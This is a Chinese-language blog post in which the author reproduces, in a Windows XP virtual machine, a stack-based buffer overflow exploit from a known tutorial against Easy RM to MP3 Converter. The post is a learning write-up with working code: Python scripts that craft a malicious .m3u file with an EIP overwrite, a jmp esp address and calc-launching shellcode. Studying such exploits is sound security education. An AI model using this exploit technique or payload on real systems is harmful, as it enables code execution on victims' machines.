---
title: Pwn 学习：Stack Based Overflows 实战
date: 2023-01-13 01:17:00
tags: CTF
---

自己第一次学汇编是一年多以前了，逆向也搞过不少，但是 pwn 一直没尝试过。越狱 iPhone 时看了看那些漏洞的 POC 第一眼就觉得好高深啊，这起码得学完操作系统以后再说了。然而逆 iOS App 的时候学 arm 汇编看的[这篇文章](https://azeria-labs.com/writing-arm-assembly-part-1/)写了这段话：

> Just think about the great tutorials on Intel x86 Exploit writing by [Fuzzy Security](https://www.fuzzysecurity.com/tutorials/expDev/1.html) or the [Corelan Team](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/) – Guidelines like these help people interested in this specific area to get practical knowledge and the inspiration to learn beyond what is covered in those tutorials.

Well... Why not try it out? 于是就开始看。Fuzzy 的看上去有点晦涩，所以就跟着 Corelan 的走了。难易程度可以说还挺适合我。感觉 prerequisite 基本上就是学过 C 以及了解过汇编（反正遇到不会的查就得了），会某种脚本语言的话就更方便。

下面基本上记录一下我自己的复现过程。

首先准备环境。我的环境：

- `en_windows_xp_professional_with_service_pack_3_x86_cd_vl_x14-73974` 在 VMware 虚拟机里跑的。
- `ImmunityDebugger_1_85_setup` [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
- `707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter` [exploit-db](https://www.exploit-db.com/exploits/10619) 下载
- `mona.py` [右键另存为下载](https://github.com/corelan/mona/raw/master/mona.py)
- `devcpp-4.9.9.2_setup` [SourceForge 下载](https://sourceforge.net/projects/dev-cpp/files/Binaries/Dev-C%2B%2B%204.9.9.2/devcpp-4.9.9.2_setup.exe/download)（惊叹，这玩意真小啊）

第一步是简单验证一下漏洞，原文用 perl 写文件，因为装 Immunity Debugger 时自动装了 Python 2.7.1 所以我就直接写 Python 了。

```python
f = open('crash.m3u', 'w')
f.write('A'*30000)
f.close()
```

装好 `EasyRMtoMP3Converter` 后导入发现直接崩溃。

然后第二步是写个小 demo 演示漏洞原理，代码

```c++
void vulnerable_func(char *buffer) {
     char canoverflow[128];
     strcpy(canoverflow, buffer);
}

int main(int argc, char **argv) {
     vulnerable_func(argv[1]);
}
```

编译完成后打开 Immunity Debugger 然后打开 exe 并且 arguments 随便填个 `AAAAAA`。进去以后单步调试观察函数调用和 strcpy 的作用。

这里有个小知识盲区，`MOV DWORD PTR SS:[ESP],EAX` 这个 `SS` 是啥意思？有的地方写的是 `DS`。于是搜了一通：[What does "DS:40207A" mean in assembly?](https://stackoverflow.com/questions/3819699/what-does-ds40207a-mean-in-assembly) 然后又找了一下 [What does `dword ptr` mean?](https://stackoverflow.com/questions/2987876/what-does-dword-ptr-mean)

第三步是把 debugger 挂到要研究的程序上观察崩溃原因。直接打开程序然后 attach 即可。

后面要找 offset 我比较直接地在栈内存那个窗口找的字符串起点……然后减一下得到 offset. 但是很奇怪的是算的不是很准而且比正确的大 10000 左右。我找的是 `0xFF730 - 0xF6E55 = 35035`. 后面二分找了一下最后结果是 26059.

```python
f = open('crash.m3u', 'w')
f.write('A'*26059+'B'*4+'XXXX'+'1ABCDEFGHIJKLMNOPQRSTUVWXYZ')
f.close()
```

后面跟着文章做了一次不成功的尝试，但是当时我其实 eip 覆盖的都是错的，因为没有写成小端……

```python
f = open('crash.m3u', 'w')
f.write('A'*26059+'\x30\xf7\x0f\x00'+'\x90'*25+'\xcc'+'\x90'*25)
f.close()
```

第四步是从加载的 DLL 里找 `jmp esp` 这个指令，绕过地址中有 `\x00` 导致字符串中间有 terminator 的问题。我用的是 [mona.py](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)（继承了 pvefindaddr）简单看了一下文档，下载放入 PyCommands 然后 DLL 加载完成后在 Immunity Debugger 底部文本框输入

```
!mona find -type bin -s ffe4
```

查找出的结果在 `C:\Program Files\Immunity Inc\Immunity Debugger\find.txt`. 打开后搜索 `MSRMCcodec02.dll` 发现这行

```
0x01acb22a (b+0x0022b22a)  : ffe4 |  {PAGE_READWRITE} [MSRMCcodec02.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll)
```

最后用了文中构造好的 shellcode 成功打开计算器

```python
f = open('crash.m3u', 'w')
shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" + \
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" + \
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" + \
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" + \
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" + \
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" + \
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" + \
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" + \
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" + \
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" + \
"\x7f\xe8\x7b\xca"
f.write('A'*26059+'\x2a\xb2\xac\x01'+'\x90'*25+shellcode+'\x90'*25)
f.close()
```

后面发现不挂载 Immunity Debugger 时打开不起作用，应该是因为 attach 在加载 DLL 前。直接打开程序然后 attach，搜索得到如下结果

```
0x01afb22a (b+0x0022b22a)  : ffe4 |  {PAGE_READWRITE} [MSRMCcodec02.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll)
```

所以改成

```python
f = open('crash.m3u', 'w')
shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" + \
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" + \
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" + \
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" + \
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" + \
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" + \
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" + \
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" + \
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" + \
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" + \
"\x7f\xe8\x7b\xca"
f.write('A'*26059+'\x2a\xb2\xaf\x01'+'\x90'*25+shellcode+'\x90'*25)
f.close()
```

最后放张成果图。

![Windows XP Professional x86-2023-01-13-01-08-36.png](https://s2.loli.net/2023/01/13/cUPWw346ReZdyI7.png)
